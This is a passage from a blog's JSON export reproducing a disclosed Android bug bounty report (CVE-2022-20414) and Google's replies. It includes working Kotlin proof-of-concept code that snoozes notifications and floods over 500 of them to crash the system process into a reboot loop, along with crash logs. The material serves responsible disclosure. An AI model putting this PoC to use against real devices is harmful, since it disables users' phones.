Team\n(1) Severity Matrix: https://source.android.com/security/overview/updates-resources#severity\n\n> ysy950803@gmail.com\n\nThanks for your efforts!\n\nI will continue to follow this issue and support you in any way I can.\n\n> ysy950803@gmail.com\n\nHello! How is the progress?\n\n> ja...@google.com\n\nHello,\n\nThank you for following up! This issue has been fixed and is targeted for release in an upcoming Android Security Bulletin. It will be reviewed for both a CVE and reward eligibility under Android Security Rewards Program rules closer to that time (1). Further details will be provided here when available.\n\nThank you,\nAndroid Security Team\n\n(1) https://www.google.com/about/appsecurity/android-rewards/\n\n> an...@google.com\n\nCongratulations! The rewards committee decided to reward you USD $5,000 for reporting this High severity vulnerability. We are paying for the bug report and proof of concept.\n\nTo collect the reward, if you haven't already, please complete the Android Contributor License Agreement for Individuals, so we can use your test code:\nhttps://cla.developers.google.com/clas\n\nYou will receive an email with details on the next steps to collect the reward.\n\nThank you for your contributions to the safety and security of the Android ecosystem.\n\nBest Regards,\nAndroid Security Team\n\n> ysy950803@gmail.com\n\nThank you for your hard work, I am honored to contribute to the Google ecosystem.\n\n> ja...@google.com\n\nHello,\n\nWe will be releasing a patch for this issue in an upcoming bulletin. It will first be released to partners, then to the public the following month.\n\nIf you haven't already, please complete the Google Contributor License Agreement for Individuals, so we can use your patch and test code (1).\n\nWe'd also like to recognize your contribution on our acknowledgements page (2). The acknowledgement information we have on record is \"Sylvester Yao (姚圣禹, blog.ysy950803.top)\". Please let us know if it has changed.\n\nWe may also make this bug publicly accessible when the fix is submitted to AOSP. Please let us know if you would like to keep the bug private instead.\n\nYour CVE ID is CVE-2022-20414.\n\nThanks,\nAndroid Security Team\n\n(1) https://cla.developers.google.com/clas\n(2) https://source.android.com/security/overview/acknowledgements\n\n> ysy950803@gmail.com\n\nThanks for your work. Where can I see the fix code?\n\n> ja...@google.com\n\nHello,\n\nThis is targeted to be released in the November bulletin. Thank you for your continued engagement with the Android VRP!\n\nBest,\nAndroid Security Team\n","slug":"Android系统无限重启漏洞","published":1,"updated":"2024-03-25T07:31:26.042Z","comments":1,"photos":[],"link":"","_id":"cluaufh1n0056the6ad65ctud","content":"<blockquote>\n<p>2022年，一次偶然的机会，我发现了一个会导致Android系统无限重启致使设备完全不可用的高危漏洞，遂提交给了Google。当年11月的AOSP补丁对此进行了修复，本文是我提交漏洞报告的原文，现公开，待整理。具体可以在<a href=\"https://source.android.com/docs/security/bulletin/2022-11-01\">Android Security Bulletin—November 2022</a>中搜索CVE-2022-20414了解更多。</p>\n</blockquote>\n<h3 id=\"Report-description\"><a href=\"#Report-description\" class=\"headerlink\" title=\"Report description\"></a>Report description</h3><blockquote>\n<p>In a few words describe your bug. This will help you search for it later.</p>\n</blockquote>\n<p>The “snoozeNotification” method of NotificationListenerService causes Android system to crash and cyclic reboot.</p>\n<h3 id=\"Bug-location\"><a href=\"#Bug-location\" class=\"headerlink\" title=\"Bug location\"></a>Bug location</h3><h4 id=\"Which-product-or-website-have-you-found-a-vulnerability-in\"><a href=\"#Which-product-or-website-have-you-found-a-vulnerability-in\" class=\"headerlink\" title=\"Which product or website have you found a vulnerability in?\"></a>Which product or website have you found a vulnerability in?</h4><p>Android</p>\n<h3 id=\"The-problem\"><a href=\"#The-problem\" class=\"headerlink\" title=\"The problem\"></a>The problem</h3><h4 id=\"Please-describe-the-technical-details-of-the-vulnerability\"><a href=\"#Please-describe-the-technical-details-of-the-vulnerability\" class=\"headerlink\" title=\"Please describe the technical details of the vulnerability\"></a>Please describe the technical details of the vulnerability</h4><p>Starting from Android 10, there is a change about <code>AlarmManagerService</code> and we can check the commit in AOSP: <a href=\"https://cs.android.com/android/_/android/platform/frameworks/base/+/0e49b64f40779d6702d10078958031fa540b6138\">Adding a per-uid cap on concurrent alarms</a>. A Google engineer added a piece of code to <code>AlarmManagerService</code>:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"title function_\">setImpl</span><span class=\"params\">(...)</span> &#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (mLock) &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (mAlarmsPerUid.get(callingUid, <span class=\"number\">0</span>) &gt;= mConstants.MAX_ALARMS_PER_UID) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">errorMsg</span> <span class=\"operator\">=</span></span><br><span class=\"line\">                <span class=\"string\">&quot;Maximum limit of concurrent alarms &quot;</span> + mConstants.MAX_ALARMS_PER_UID</span><br><span class=\"line\">                + <span class=\"string\">&quot; reached for uid: &quot;</span> + UserHandle.formatUid(callingUid)</span><br><span class=\"line\">                + <span class=\"string\">&quot;, callingPackage: &quot;</span> + callingPackage;</span><br><span class=\"line\">            <span class=\"comment\">// STOPSHIP (b/128866264): Just to catch breakages. Remove before final release.</span></span><br><span class=\"line\">            Slog.wtf(TAG, errorMsg);</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">UnsupportedOperationException</span>(errorMsg);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>For any package, if the current number of alarms exceeds 500, an <code>UnsupportedOperationException</code> will be thrown and cause the process to crash, <strong>even if it is a system process.</strong></p>\n<p>In general, we do not have permission to set alarm for Android system processes. But let’s take a look at another piece of code that can be implemented by any third-party application:</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TestCrashService</span> : <span class=\"type\">NotificationListenerService</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">val</span> random = Random(System.currentTimeMillis())</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">override</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">onNotificationPosted</span><span class=\"params\">(sbn: <span class=\"type\">StatusBarNotification</span>?)</span></span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">         * Snooze any notification here with a random duration (fixed duration also works).</span></span><br><span class=\"line\"><span class=\"comment\">         * The duration better be longer so snoozing can be maintained.</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        sbn?.let &#123;</span><br><span class=\"line\">            <span class=\"keyword\">val</span> duration = TimeUnit.DAYS.toMillis(random.nextLong(<span class=\"number\">30</span>, <span class=\"number\">365</span>))</span><br><span class=\"line\">            snoozeNotification(it.key, duration)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>We can import <code>android.service.notification.NotificationListenerService</code> and implement a subclass. <strong>A pending alarm is set by <code>AlarmManager</code> when <code>snoozeNotification</code> method is called.</strong></p>\n<p>You can run <code>adb shell dumpsys alarm</code> to find the alarm like this:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RTC_WAKEUP #164: Alarm&#123;6975754 type 0 origWhen 1684207980006 whenElapsed 30672085209 android&#125;</span><br><span class=\"line\">tag=*walarm*:SnoozeHelper.EVALUATE</span><br><span class=\"line\">type=RTC_WAKEUP origWhen=2023-05-16 11:33:00.006 window=0 exactAllowReason=allow-listed repeatInterval=0 count=0 flags=0x9</span><br><span class=\"line\">policyWhenElapsed: requester=+354d23h27m52s23ms app_standby=-8m44s929ms device_idle=-- battery_saver=-- power_pending=--</span><br><span class=\"line\">whenElapsed=+354d23h27m52s23ms maxWhenElapsed=+354d23h27m52s23ms</span><br><span class=\"line\">operation=PendingIntent&#123;a03f6fd: PendingIntentRecord&#123;d9f6ff2 android broadcastIntent&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>If there are so many notifications being snoozing, an equivalent amount of pending alarms will be attached to the <strong>system process</strong> <code>android</code>. It’s very dangerous because an exception is waiting for you before reaching the maximum limit.</p>\n<p><strong>Finally, the system crashes and is likely to fall into a loop of reboots. That’s where the vulnerability lies.</strong></p>\n<h4 id=\"Please-briefly-explain-who-can-exploit-the-vulnerability-and-what-they-gain-when-doing-so\"><a href=\"#Please-briefly-explain-who-can-exploit-the-vulnerability-and-what-they-gain-when-doing-so\" class=\"headerlink\" title=\"Please briefly explain who can exploit the vulnerability, and what they gain when doing so\"></a>Please briefly explain who can exploit the vulnerability, and what they gain when doing so</h4><p>I have to say that this is a very serious system vulnerability. For any application that implements <code>NotificationListenerService</code>, as long as users <strong>allow notification access</strong>, it may cause Android system processes to crash, further causing the device to get stuck in a reboot loop and become unavailable.</p>\n<p>We can find many apps designed to manage notifications on Play Store. They may use <code>snoozeNotification</code> method to delay or eliminate notifications. If notifications are so many and snoozing duration is not short, there will be a risk of causing Android system to crash once the number of pending alarms reaches the limit.</p>\n<p><strong>In other words, someone with bad intentions has way to use this vulnerability to develop malicious applications that can blackmail others.</strong> For the average user, it is difficult to recover from this reboot loop.</p>\n<h4 id=\"Upload-file\"><a href=\"#Upload-file\" class=\"headerlink\" title=\"Upload file\"></a>Upload file</h4><blockquote>\n<p>You can add a file to your report to provide additional information on the vulnerability. Max file size is 50MB.</p>\n</blockquote>\n<p>……</p>\n<h3 id=\"The-cause\"><a href=\"#The-cause\" class=\"headerlink\" title=\"The cause\"></a>The cause</h3><h4 id=\"Please-specify-the-steps-to-reproduce-the-issue-including-sample-code-where-appropriate-Please-be-as-detailed-as-possible\"><a href=\"#Please-specify-the-steps-to-reproduce-the-issue-including-sample-code-where-appropriate-Please-be-as-detailed-as-possible\" class=\"headerlink\" title=\"Please specify the steps to reproduce the issue, including sample code where appropriate. Please be as detailed as possible.\"></a>Please specify the steps to reproduce the issue, including sample code where appropriate. Please be as detailed as possible.</h4><p>Any application can cause a system crash in just two steps. The sample code has been included in a complete Android Studio project attatched below.</p>\n<p>Step 1: Please allow notification access for the app. Then the implementation of <code>NotificationListenerService</code> can be running.</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">startNotificationAccessSetting</span><span class=\"params\">(context: <span class=\"type\">Context</span>)</span></span> = <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).apply &#123;</span><br><span class=\"line\">        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    <span class=\"literal\">true</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (e: ActivityNotFoundException) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        context.startActivity(Intent().apply &#123;</span><br><span class=\"line\">            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)</span><br><span class=\"line\">            component = ComponentName(</span><br><span class=\"line\">                <span class=\"string\">&quot;com.android.settings&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;com.android.settings.Settings\\$NotificationAccessSettingsActivity&quot;</span></span><br><span class=\"line\">            )</span><br><span class=\"line\">            putExtra(<span class=\"string\">&quot;:settings:show_fragment&quot;</span>, <span class=\"string\">&quot;NotificationAccessSettings&quot;</span>)</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">        <span class=\"literal\">true</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (e1: Exception) &#123;</span><br><span class=\"line\">        <span class=\"literal\">false</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>And the subclass is simple like this:</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TestCrashService</span> : <span class=\"type\">NotificationListenerService</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">val</span> random = Random(System.currentTimeMillis())</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">override</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">onNotificationPosted</span><span class=\"params\">(sbn: <span class=\"type\">StatusBarNotification</span>?)</span></span> &#123;</span><br><span class=\"line\">        sbn?.let &#123;</span><br><span class=\"line\">            <span class=\"keyword\">val</span> duration = TimeUnit.DAYS.toMillis(random.nextLong(<span class=\"number\">30</span>, <span class=\"number\">365</span>))</span><br><span class=\"line\">            snoozeNotification(it.key, duration)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Step 2: Post a large number of notifications over 500 (<code>MAX_ALARMS_PER_UID</code>).</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">step2</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">val</span> name = <span class=\"string\">&quot;CrashBySnooze&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">val</span> descriptionText = <span class=\"string\">&quot;For test crash.&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">val</span> importance = NotificationManager.IMPORTANCE_LOW</span><br><span class=\"line\">    <span class=\"keyword\">val</span> channel = NotificationChannel(<span class=\"string\">&quot;crash_by_snooze&quot;</span>, name, importance).apply &#123;</span><br><span class=\"line\">        description = descriptionText</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">val</span> ntfMgr = getSystemService(Context.NOTIFICATION_SERVICE) <span class=\"keyword\">as</span> NotificationManager</span><br><span class=\"line\">    ntfMgr.createNotificationChannel(channel)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">val</span> ntfBuilder = NotificationCompat.Builder(applicationContext, <span class=\"string\">&quot;crash_by_snooze&quot;</span>)</span><br><span class=\"line\">        .setContentTitle(<span class=\"string\">&quot;CrashBySnooze&quot;</span>)</span><br><span class=\"line\">        .setContentText(<span class=\"string\">&quot;For test crash.&quot;</span>)</span><br><span class=\"line\">        .setSmallIcon(R.mipmap.ic_launcher)</span><br><span class=\"line\">        .setPriority(NotificationCompat.PRIORITY_LOW)</span><br><span class=\"line\">    mainScope.launch(Dispatchers.IO) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">val</span> ntfBaseId = Random(System.currentTimeMillis()).nextInt(<span class=\"number\">123456</span>, <span class=\"number\">654321</span>)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (i <span class=\"keyword\">in</span> <span class=\"number\">0.</span><span class=\"number\">.555</span>) &#123;</span><br><span class=\"line\">            ntfMgr.notify(ntfBaseId + i, ntfBuilder.build())</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Daily use will not have so many notifications appear at once, but day by day, this is chronic death for your Android device.</p>\n<h4 id=\"Specify-the-build-fingerprint-from-the-device-used-to-reproduce-the-issue-The-issue-should-reproduce-on-a-recent-build-within-the-last-30-days\"><a href=\"#Specify-the-build-fingerprint-from-the-device-used-to-reproduce-the-issue-The-issue-should-reproduce-on-a-recent-build-within-the-last-30-days\" class=\"headerlink\" title=\"Specify the build fingerprint from the device used to reproduce the issue. The issue should reproduce on a recent build (within the last 30 days).\"></a>Specify the build fingerprint from the device used to reproduce the issue. The issue should reproduce on a recent build (within the last 30 days).</h4><blockquote>\n<p>run adb shell getprop ro.build.fingerprint and adb shell cat &#x2F;proc&#x2F;version for kernel vulnerabilities</p>\n</blockquote>\n<p>All devices based on Android 10+ (i.e. 10~13) have this vulnerability.</p>\n<h4 id=\"Provide-a-Proof-of-Concept-complete-Android-Studio-project-source-code-including-an-Android-bp-file-or-similar-artifacts\"><a href=\"#Provide-a-Proof-of-Concept-complete-Android-Studio-project-source-code-including-an-Android-bp-file-or-similar-artifacts\" class=\"headerlink\" title=\"Provide a Proof of Concept, complete Android Studio project, source code including an Android.bp file, or similar artifacts.\"></a>Provide a Proof of Concept, complete Android Studio project, source code including an Android.bp file, or similar artifacts.</h4><blockquote>\n<p>You can also include a malformed media file, or a video walkthrough for UX issues.</p>\n</blockquote>\n<p>……</p>\n<h4 id=\"Provide-crash-artifacts-including-stack-trace-if-available\"><a href=\"#Provide-crash-artifacts-including-stack-trace-if-available\" class=\"headerlink\" title=\"Provide crash artifacts including stack trace (if available).\"></a>Provide crash artifacts including stack trace (if available).</h4><p>The crash can cause system zyote to die:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2022-05-27 16:35:11.453 1451-1451/system_process W/AlarmManager: Maximum limit of concurrent alarms 500 reached for uid: 1000, callingPackage: android</span><br><span class=\"line\">2022-05-27 16:35:11.453 1451-1451/system_process E/Zygote: System zygote died with fatal exception</span><br><span class=\"line\">    java.lang.IllegalStateException: Maximum limit of concurrent alarms 500 reached for uid: 1000, callingPackage: android</span><br><span class=\"line\">        at com.android.server.alarm.AlarmManagerService.setImpl(AlarmManagerService.java:2087)</span><br><span class=\"line\">        at com.android.server.alarm.AlarmManagerService$5.set(AlarmManagerService.java:2630)</span><br><span class=\"line\">        at android.app.AlarmManager.setImpl(AlarmManager.java:957)</span><br><span class=\"line\">        at android.app.AlarmManager.setImpl(AlarmManager.java:917)</span><br><span class=\"line\">        at android.app.AlarmManager.setExactAndAllowWhileIdle(AlarmManager.java:1185)</span><br><span class=\"line\">        at com.android.server.notification.SnoozeHelper.lambda$scheduleRepostAtTime$2$SnoozeHelper(SnoozeHelper.java:508)</span><br><span class=\"line\">        at com.android.server.notification.SnoozeHelper$$ExternalSyntheticLambda4.run(Unknown Source:10)</span><br><span class=\"line\">        at com.android.server.notification.SnoozeHelper.scheduleRepostAtTime(SnoozeHelper.java:513)</span><br><span class=\"line\">        at com.android.server.notification.SnoozeHelper.scheduleRepost(SnoozeHelper.java:498)</span><br><span class=\"line\">        at com.android.server.notification.SnoozeHelper.snooze(SnoozeHelper.java:240)</span><br><span class=\"line\">        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.snoozeNotificationLocked(NotificationManagerService.java:6978)</span><br><span class=\"line\">        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.snoozeLocked(NotificationManagerService.java:6955)</span><br><span class=\"line\">        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.run(NotificationManagerService.java:6920)</span><br><span class=\"line\">        at android.os.Handler.handleCallback(Handler.java:938)</span><br><span class=\"line\">        at android.os.Handler.dispatchMessage(Handler.java:99)</span><br><span class=\"line\">        at android.os.Looper.loopOnce(Looper.java:210)</span><br><span class=\"line\">        at android.os.Looper.loop(Looper.java:299)</span><br><span class=\"line\">        at com.android.server.SystemServer.run(SystemServer.java:951)</span><br><span class=\"line\">        at com.android.server.SystemServer.main(SystemServer.java:641)</span><br><span class=\"line\">        at java.lang.reflect.Method.invoke(Native Method)</span><br><span class=\"line\">        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:576)</span><br><span class=\"line\">        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1051)</span><br><span class=\"line\">2022-05-27 16:35:11.454 1451-1451/system_process E/AndroidRuntime: *** FATAL EXCEPTION IN SYSTEM PROCESS: main</span><br><span class=\"line\">    java.lang.IllegalStateException: Maximum limit of concurrent alarms 500 reached for uid: 1000, callingPackage: android</span><br><span class=\"line\">        at com.android.server.alarm.AlarmManagerService.setImpl(AlarmManagerService.java:2087)</span><br><span class=\"line\">        at com.android.server.alarm.AlarmManagerService$5.set(AlarmManagerService.java:2630)</span><br><span class=\"line\">        at android.app.AlarmManager.setImpl(AlarmManager.java:957)</span><br><span class=\"line\">        at android.app.AlarmManager.setImpl(AlarmManager.java:917)</span><br><span class=\"line\">        at android.app.AlarmManager.setExactAndAllowWhileIdle(AlarmManager.java:1185)</span><br><span class=\"line\">        at com.android.server.notification.SnoozeHelper.lambda$scheduleRepostAtTime$2$SnoozeHelper(SnoozeHelper.java:508)</span><br><span class=\"line\">        at com.android.server.notification.SnoozeHelper$$ExternalSyntheticLambda4.run(Unknown Source:10)</span><br><span class=\"line\">        at com.android.server.notification.SnoozeHelper.scheduleRepostAtTime(SnoozeHelper.java:513)</span><br><span class=\"line\">        at com.android.server.notification.SnoozeHelper.scheduleRepost(SnoozeHelper.java:498)</span><br><span class=\"line\">        at com.android.server.notification.SnoozeHelper.snooze(SnoozeHelper.java:240)</span><br><span class=\"line\">        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.snoozeNotificationLocked(NotificationManagerService.java:6978)</span><br><span class=\"line\">        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.snoozeLocked(NotificationManagerService.java:6955)</span><br><span class=\"line\">        at com.android.server.notification.NotificationManagerService$SnoozeNotificationRunnable.run(NotificationManagerService.java:6920)</span><br><span class=\"line\">        at android.os.Handler.handleCallback(Handler.java:938)</span><br><span class=\"line\">        at android.os.Handler.dispatchMessage(Handler.java:99)</span><br><span class=\"line\">        at android.os.Looper.loopOnce(Looper.java:210)</span><br><span class=\"line\">        at android.os.Looper.loop(Looper.java:299)</span><br><span class=\"line\">        at com.android.server.SystemServer.run(SystemServer.java:951)</span><br><span class=\"line\">        at com.android.server.SystemServer.main(SystemServer.java:641)</span><br><span class=\"line\">        at java.lang.reflect.Method.invoke(Native Method)</span><br><span class=\"line\">        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:576)</span><br><span class=\"line\">        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1051)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"HWASan-output-if-available\"><a href=\"#HWASan-output-if-available\" class=\"headerlink\" title=\"HWASan output (if available)\"></a>HWASan output (if available)</h4><p>……</p>\n<h4 id=\"Does-anyone-else-know-about-this-vulnerability\"><a href=\"#Does-anyone-else-know-about-this-vulnerability\" class=\"headerlink\" title=\"Does anyone else know about this vulnerability?\"></a>Does anyone else know about this vulnerability?</h4><ul>\n<li>No, this vulnerability is private</li>\n<li>Yes, this vulnerability is public or known to third parties</li>\n</ul>\n<h4 id=\"How-would-you-like-to-be-publicly-acknowledged-for-your-report\"><a href=\"#How-would-you-like-to-be-publicly-acknowledged-for-your-report\" class=\"headerlink\" title=\"How would you like to be publicly acknowledged for your report?\"></a>How would you like to be publicly acknowledged for your report?</h4><blockquote>\n<p>If your report is successful we will acknowledge you using this information in the next release.</p>\n</blockquote>\n<p>It’s my pleasure.</p>\n<hr>\n<h3 id=\"What-to-expect\"><a href=\"#What-to-expect\" class=\"headerlink\" title=\"What to expect\"></a>What to expect</h3><ol>\n<li>You will receive an email confirming we have received your report</li>\n<li>The report will be sorted and added to the queue of reports</li>\n<li>A member of the team will review your report and determine if it is a valid</li>\n<li>During this stage it is common for us to contact you with questions about your report</li>\n<li>The report is then triaged and the details of the bug are supplied to the relevant team</li>\n<li>Depending on the bug we may take between 7 and 14 days to determine the bug’s severity</li>\n<li>If successful we will contact you to inform you of your reward</li>\n</ol>\n<hr>\n<h3 id=\"Comments\"><a href=\"#Comments\" class=\"headerlink\" title=\"Comments\"></a>Comments</h3><blockquote>\n<p><a href=\"mailto:&#x79;&#115;&#121;&#57;&#x35;&#x30;&#56;&#48;&#x33;&#64;&#x67;&#x6d;&#97;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;\">&#x79;&#115;&#121;&#57;&#x35;&#x30;&#56;&#48;&#x33;&#64;&#x67;&#x6d;&#97;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;</a></p>\n</blockquote>\n<p>I have some suggestions as solutions:</p>\n<ol>\n<li>Hide the <code>snoozeNotification</code> method for app developers.</li>\n<li>Alarms cannot be set for system processes by non-system processes.</li>\n<li>Don’t throw an exception for system processes when reaching the maximum limit of alarms, then we can delete the alarm with the longest duration before set a new alarm.</li>\n</ol>\n<blockquote>\n<p><a href=\"mailto:&#106;&#x61;&#x2e;&#46;&#x2e;&#64;&#103;&#111;&#111;&#x67;&#x6c;&#101;&#46;&#99;&#x6f;&#109;\">&#106;&#x61;&#x2e;&#46;&#x2e;&#64;&#103;&#111;&#111;&#x67;&#x6c;&#101;&#46;&#99;&#x6f;&#109;</a></p>\n</blockquote>\n<p>Assigned to <a href=\"mailto:&#x61;&#115;&#x2e;&#46;&#x2e;&#x40;&#x67;&#111;&#x6f;&#x67;&#x6c;&#101;&#46;&#x63;&#111;&#x6d;\">&#x61;&#115;&#x2e;&#46;&#x2e;&#x40;&#x67;&#111;&#x6f;&#x67;&#x6c;&#101;&#46;&#x63;&#111;&#x6d;</a>.<br>Thank you for submitting this report. We’ve filed an internal report for the Android engineering team to investigate further (specified by the Android ID label). Please follow coordinated disclosure practices, such as keeping this report confidential until we have had time to assess your issue, and if necessary, release an update for Android devices.</p>\n<p>PLEASE TAKE THE FOLLOWING ACTIONS NOW, if you have not already:</p>\n<ol>\n<li>Sign the Google Contributor License Agreement (1).</li>\n<li>In a comment below, let us know how you would like to be acknowledged (2) for discovering this potential vulnerability (including company affiliation, if any).</li>\n<li>Provide a PoC that reproduces against a recent Android build (not more than 30 days old).</li>\n</ol>\n<p>The typical lifecycle for a confirmed security vulnerability is as 